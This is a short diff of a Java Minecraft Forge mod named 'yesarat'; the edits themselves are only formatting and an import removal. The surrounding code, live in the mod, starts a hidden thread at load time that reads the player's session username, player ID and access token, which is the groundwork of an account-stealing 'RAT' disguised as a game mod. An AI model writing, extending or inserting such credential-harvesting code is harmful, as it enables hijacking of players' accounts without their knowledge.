@@ -5,11 +5,9 @@ import net.minecraft.util.Session;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
-import java.lang.reflect.Field;
-
 @Mod(modid = "yesarat")
 public class Main {
-
+	
 	@Mod.EventHandler
 	public void preInit(FMLPreInitializationEvent event) {
 		new Thread(() -> {
@@ -18,7 +16,7 @@ public class Main {
 				System.out.println(session.getUsername());
 				System.out.println(session.getPlayerID());
 				System.out.println(session.getToken());
-			} catch(Exception exc) {
+			} catch (Exception exc) {
 			}
 		}).start();
 	}
